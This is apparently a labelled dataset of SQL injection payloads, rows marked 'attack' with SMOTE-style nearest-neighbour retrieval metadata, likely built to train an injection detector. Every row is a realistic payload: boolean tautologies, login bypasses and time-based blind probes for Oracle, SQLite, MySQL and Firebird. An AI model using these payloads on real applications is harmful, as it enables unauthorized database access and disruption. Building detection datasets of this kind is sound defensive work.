id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000028,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000169,0.49258254941366775
SMOTE_000029,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.24709084709008863
SMOTE_000030,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,1.0301257483823496
SMOTE_000031,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000072,0.41391739294045793
SMOTE_000032,attack,boolean,"1%"" and 5411  =  7697 and ""%""  =  """,nearest_attack_euclidean,R000124,2.0304752114391857
SMOTE_000033,attack,boolean,end and    (    (   'vcaf' like 'vcaf,nearest_attack_euclidean,R000156,0.07792271103584723
SMOTE_000034,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R000308,0.7842869411779212
SMOTE_000035,attack,boolean,-6045 or 8919  =  2827--,nearest_attack_euclidean,R000054,0.1502990299691552
SMOTE_000036,attack,boolean,"-5672%"" or 3825  =  9675--",nearest_attack_euclidean,R000078,0.281865439683592
SMOTE_000037,attack,boolean,1' and 7528  =  2894 and 'qoyw'  =  'qoyw,nearest_attack_euclidean,R000091,0.7649863916983914
SMOTE_000038,attack,boolean,-1643' where 1968  =  1968 or 3484  =  6642,nearest_attack_euclidean,R000291,0.43527359943487637
SMOTE_000039,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.6979385253365017
SMOTE_000040,attack,boolean,"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld",nearest_attack_euclidean,R000134,0.56792361150514
SMOTE_000041,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000081,0.39024027843123693
SMOTE_000042,attack,boolean,1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',nearest_attack_euclidean,R000155,0.9792986372778973
SMOTE_000043,attack,boolean," end and    (    (     (  ""zpii"" like ""zpii",nearest_attack_euclidean,R000087,0.27441091770715786
SMOTE_000044,attack,boolean,-2960' or 2163  =  3143--,nearest_attack_euclidean,R000113,0.01574083034139343
SMOTE_000045,attack,boolean,"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",nearest_attack_euclidean,R000151,1.1516618647696937
SMOTE_000046,attack,boolean,-3849  )   or 5580  =  3442--,nearest_attack_euclidean,R000109,0.46109747306285515
SMOTE_000047,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,2.1196591211856566
SMOTE_000048,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",nearest_attack_euclidean,R000142,0.5008841962987848
SMOTE_000049,attack,boolean,1 and 7533  =  7533-- spzi,nearest_attack_euclidean,R000188,0.12693744475686086
SMOTE_000050,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000035,1.8725167139910113
SMOTE_000051,attack,boolean,end and 'wdce'  =  'wdce,nearest_attack_euclidean,R000275,0.344111535437536
SMOTE_000052,attack,boolean, or 2 > 1,nearest_attack_euclidean,R000026,1.921377259164495
SMOTE_000053,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo",nearest_attack_euclidean,R000246,0.0019806932044574206
SMOTE_000054,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000081,0.047761812344314196
SMOTE_000055,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.0
SMOTE_000056,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.6948691476936694
SMOTE_000057,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg",nearest_attack_euclidean,R000115,0.072152787645644
SMOTE_000058,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000014,2.214950114783468
SMOTE_000059,attack,boolean,"1 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000304,1.3129281920366032
SMOTE_000060,attack,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R000182,0.023903812073501216
SMOTE_000061,attack,boolean,"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",nearest_attack_euclidean,R000108,0.29869720717587034
SMOTE_000062,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000043,0.12221273105879853
SMOTE_000063,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.006268456222736445
SMOTE_000064,attack,boolean,or 0  =  0 #,nearest_attack_euclidean,R000015,0.03235873562290162
SMOTE_000065,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000196,0.4998261165386144
SMOTE_000066,attack,boolean,-3748' where 9292  =  9292 or 3337  =  2859#,nearest_attack_euclidean,R000173,0.24920028600522087
SMOTE_000067,attack,boolean,"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",nearest_attack_euclidean,R000202,1.6884265759508026
SMOTE_000068,attack,boolean,"1 and elt  (  2770  =  3669,3669  )  # sfls",nearest_attack_euclidean,R000137,0.686278363174175
SMOTE_000069,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000032,0.27000302512144914
SMOTE_000070,attack,boolean,"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000158,2.3483144253246766
SMOTE_000071,attack,boolean,or 2 between 1 and 3,nearest_attack_euclidean,R000007,1.6169998270402586
SMOTE_000072,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'afdy' like 'afdy",nearest_attack_euclidean,R000282,0.7460380565214485
SMOTE_000073,attack,boolean,-6488' or 5164  =  9234,nearest_attack_euclidean,R000143,0.07028317762892858
SMOTE_000074,attack,boolean, or 2 > 1,nearest_attack_euclidean,R000026,1.184538479005601
SMOTE_000075,attack,boolean,-4557 or 6872  =  6872-- kkte,nearest_attack_euclidean,R000063,0.022463291714379652
SMOTE_000076,attack,boolean,"-4054"" or 2824  =  4788--",nearest_attack_euclidean,R000122,2.275776112133531
SMOTE_000077,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000224,0.6210287426277091
SMOTE_000078,attack,boolean,"1' in boolean mode  )   and make_set  (  7804  =  3315,3315  )  #",nearest_attack_euclidean,R000071,0.1628661426414433
SMOTE_000079,attack,boolean,1' where 7882  =  7882 and 6663  =  4524--,nearest_attack_euclidean,R000167,1.081667604615904
SMOTE_000080,attack,boolean,1 and 5934  =  7745,nearest_attack_euclidean,R000079,0.868218901047521
SMOTE_000081,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000231,0.2521616813440547
SMOTE_000082,attack,boolean,"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ztzu",nearest_attack_euclidean,R000310,0.19326662434762593
SMOTE_000083,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000196,0.5032915463484192
SMOTE_000084,attack,boolean,"1 and make_set  (  6911  =  1867,1867  )  ",nearest_attack_euclidean,R000247,0.32660882794603785
SMOTE_000085,attack,boolean,1 and 9412  =  6877#,nearest_attack_euclidean,R000127,0.9635880712530945
SMOTE_000086,attack,boolean,"1'+  (  select 'ayod' where 7839  =  7839 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R000296,1.5468698379845358
SMOTE_000087,attack,boolean,"1' and elt  (  2266  =  7467,7467  )  ",nearest_attack_euclidean,R000211,4.254235077205034
SMOTE_000088,attack,boolean,-6310 or 6715  =  3399,nearest_attack_euclidean,R000102,0.02554041710079048
SMOTE_000089,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000116,1.371942342948072
SMOTE_000090,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,1.5562023923722268
SMOTE_000091,attack,boolean,-6081 where 3681  =  3681 or 2603  =  3138--,nearest_attack_euclidean,R000165,0.9282101566972426
SMOTE_000092,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000043,1.1296061762706442
SMOTE_000093,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000139,0.6162645753951325
SMOTE_000094,attack,boolean,1 and 8398  =  1891-- naov,nearest_attack_euclidean,R000238,0.6391367562948913
SMOTE_000095,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj",nearest_attack_euclidean,R000200,0.4582952396882425
SMOTE_000096,attack,boolean,-5580 or 4829  =  1968,nearest_attack_euclidean,R000123,0.0
SMOTE_000097,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000099,0.6267090943731358
SMOTE_000098,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,1.7509448756842352
SMOTE_000099,attack,boolean,1' and 2908  =  8067--,nearest_attack_euclidean,R000261,1.4110978671024108
SMOTE_000100,attack,boolean,-6764'  )   or 2314  =  2017--,nearest_attack_euclidean,R000272,0.10200635939301146
SMOTE_000101,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R000253,1.2455420330034515
SMOTE_000102,attack,boolean,"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",nearest_attack_euclidean,R000168,1.1287940905242069
SMOTE_000103,attack,boolean,"admin"" or ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.4669133428855066
SMOTE_000104,attack,boolean,"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R000197,0.3899028282738749
SMOTE_000105,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000020,0.9547584189757761
SMOTE_000106,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,5.946971482833433
SMOTE_000107,attack,boolean,-9950' or 4425  =  1975,nearest_attack_euclidean,R000076,0.04635591404317072
SMOTE_000108,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",nearest_attack_euclidean,R000215,0.3092105819793937
SMOTE_000109,attack,boolean,"-7764"" or 7308  =  7805",nearest_attack_euclidean,R000112,0.008228024062775266
SMOTE_000110,attack,boolean,1' and 7528  =  2894 and 'qoyw'  =  'qoyw,nearest_attack_euclidean,R000091,0.40076835663555554
SMOTE_000111,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.05214490940443495
SMOTE_000112,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000082,0.37401051255233275
SMOTE_000113,attack,boolean,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",nearest_attack_euclidean,R000240,0.9296293464334248
SMOTE_000114,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R000235,0.9673980204954353
SMOTE_000115,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.7376854825051277
SMOTE_000116,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'cpoy'  =  'cpoy",nearest_attack_euclidean,R000281,1.7494567936483052
SMOTE_000117,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000116,0.07905386286448746
SMOTE_000118,attack,boolean,or 3  =  3 --,nearest_attack_euclidean,R000312,0.5820467676758788
SMOTE_000119,attack,boolean,"-7146"" where 6431  =  6431 or 8548  =  5549--",nearest_attack_euclidean,R000219,0.9756384459302813
SMOTE_000120,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000080,0.47273963791017864
SMOTE_000121,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000012,1.9374477669605281
SMOTE_000122,attack,boolean,-9217 or 9323  =  9323#,nearest_attack_euclidean,R000141,0.012972123330993051
SMOTE_000123,attack,boolean,or a  =  a--,nearest_attack_euclidean,R000039,1.5382408686695643
SMOTE_000124,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R000224,0.05494651321336137
SMOTE_000125,attack,boolean,1 and   (  5369  =  8325  )  *8325# psze,nearest_attack_euclidean,R000201,0.03400736134852457
SMOTE_000126,attack,boolean,or 1/*,nearest_attack_euclidean,R000028,1.3206985592514766
SMOTE_000127,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,0.5720837458849793
SMOTE_000128,attack,boolean,or 1  =  1--,nearest_attack_euclidean,R000006,0.012863070201616414
SMOTE_000129,attack,boolean,-1643' where 1968  =  1968 or 3484  =  6642,nearest_attack_euclidean,R000291,0.8518560094996609
SMOTE_000130,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000119,2.0982654175116804
SMOTE_000131,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R000311,0.9563305528522396
SMOTE_000132,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000072,0.19160595400492095
SMOTE_000133,attack,boolean,"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",nearest_attack_euclidean,R000100,0.2663066069912531
SMOTE_000134,attack,boolean,"-9721' or elt  (  9511  =  9238,9238  )  ",nearest_attack_euclidean,R000186,0.7068442822472845
SMOTE_000135,attack,boolean,1  )   as vbli where 5139  =  5139 and 2782  =  2625--,nearest_attack_euclidean,R000065,0.23082416315539908
SMOTE_000136,attack,boolean,1' and 1661  =  1244 and 'dcha'  =  'dcha,nearest_attack_euclidean,R000133,0.06391774062630656
SMOTE_000137,attack,boolean,-3243 or 2266  =  3583#,nearest_attack_euclidean,R000213,0.18758476340873742
SMOTE_000138,attack,boolean,-7497'  )   as kjzt where 3758  =  3758 or 4794  =  9499--,nearest_attack_euclidean,R000152,0.8737058828977444
SMOTE_000139,attack,boolean,"1 and make_set  (  9681  =  4703,4703  )  # zbrf",nearest_attack_euclidean,R000166,0.27494143434119417
SMOTE_000140,attack,boolean,"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000305,0.1955059123137028
SMOTE_000141,attack,boolean,"-4325' or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R000230,0.5470639310787876
SMOTE_000142,attack,boolean,-8684' where 9820  =  9820 or 6844  =  5105,nearest_attack_euclidean,R000146,0.6631513582702676
SMOTE_000143,attack,boolean,"-4945 or make_set  (  9354  =  9354,7185  )  ",nearest_attack_euclidean,R000182,0.4941836489549389
SMOTE_000144,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000231,0.00025920868303689823
SMOTE_000145,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",nearest_attack_euclidean,R000237,0.06257789507317539
SMOTE_000146,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R000244,0.1994530756830642
SMOTE_000147,attack,boolean,or 1  =  1/*,nearest_attack_euclidean,R000004,0.34800813304324607
SMOTE_000148,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000037,2.4260605829151918
SMOTE_000149,attack,boolean,-5580 or 4829  =  1968,nearest_attack_euclidean,R000123,0.025059067377427708
SMOTE_000150,attack,boolean,"-5014%""   )    )     )   or 3348  =  2430--",nearest_attack_euclidean,R000236,0.30258331978692893
SMOTE_000151,attack,boolean,"1 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- ztzu",nearest_attack_euclidean,R000310,0.46846063545921957
SMOTE_000152,attack,boolean,or 3  =  3 --,nearest_attack_euclidean,R000312,0.1342238113620988
SMOTE_000153,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R000285,0.5757232914124322
SMOTE_000154,attack,boolean,"-4054"" or 2824  =  4788--",nearest_attack_euclidean,R000122,1.1211210253448483
SMOTE_000155,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R000257,0.12002078259237246
SMOTE_000156,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R000212,0.6350031455384249
SMOTE_000157,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R000298,0.9997746916302455
SMOTE_000158,attack,boolean,-3520%' or 8571  =  8571--,nearest_attack_euclidean,R000302,0.5939493966043653
SMOTE_000159,attack,boolean,"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",nearest_attack_euclidean,R000205,1.360983092540102
SMOTE_000160,attack,boolean,"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # lgoz",nearest_attack_euclidean,R000177,0.32977594114806946
SMOTE_000161,attack,boolean,-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,nearest_attack_euclidean,R000125,0.6476595390160622
SMOTE_000162,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",nearest_attack_euclidean,R000142,0.32577045081483036
SMOTE_000163,attack,boolean,"1' in boolean mode  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000305,0.15925546721220635
SMOTE_000164,attack,boolean,"1"" and   (  3020  =  3020  )  *6703 and ""itpt""  =  ""itpt",nearest_attack_euclidean,R000151,0.4916627378966859
SMOTE_000165,attack,boolean,"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",nearest_attack_euclidean,R000242,0.6246881021134021
SMOTE_000166,attack,boolean,-1772' or 7911  =  4985#,nearest_attack_euclidean,R000231,0.07147033504627548
SMOTE_000167,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""cuzi"" like ""cuzi",nearest_attack_euclidean,R000103,0.8038367435272068
SMOTE_000168,attack,boolean,-3520%' or 8571  =  8571--,nearest_attack_euclidean,R000302,0.20938587774574544
SMOTE_000169,attack,boolean,x' or full_name like '%bob%,nearest_attack_euclidean,R000024,0.21064070285335332
SMOTE_000170,attack,boolean,1' in boolean mode  )   and 4457  =  3885#,nearest_attack_euclidean,R000262,0.7271405024811533
SMOTE_000171,attack,boolean,-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,nearest_attack_euclidean,R000050,0.5416708695859579
SMOTE_000172,attack,boolean,1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,nearest_attack_euclidean,R000228,0.6513916508932024
SMOTE_000173,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",nearest_attack_euclidean,R000215,0.1989718351515083
SMOTE_000174,attack,boolean,"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000090,0.016551090622210305
SMOTE_000175,attack,boolean,-3748' where 9292  =  9292 or 3337  =  2859#,nearest_attack_euclidean,R000173,0.82105513800767
SMOTE_000176,attack,boolean," end and   (  ""nuix"" like ""nuix",nearest_attack_euclidean,R000077,1.0252167208299006
SMOTE_000177,attack,boolean,-8465' where 5242  =  5242 or 3806  =  7423--,nearest_attack_euclidean,R000082,0.14663374705818577
SMOTE_000178,attack,boolean,or 1 --',nearest_attack_euclidean,R000005,0.5645257092288472
SMOTE_000179,attack,boolean,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",nearest_attack_euclidean,R000240,0.4519422731802231
SMOTE_000180,attack,boolean,1' and 5835  =  6157 and 'bjee' like 'bjee,nearest_attack_euclidean,R000293,0.04689445193344536
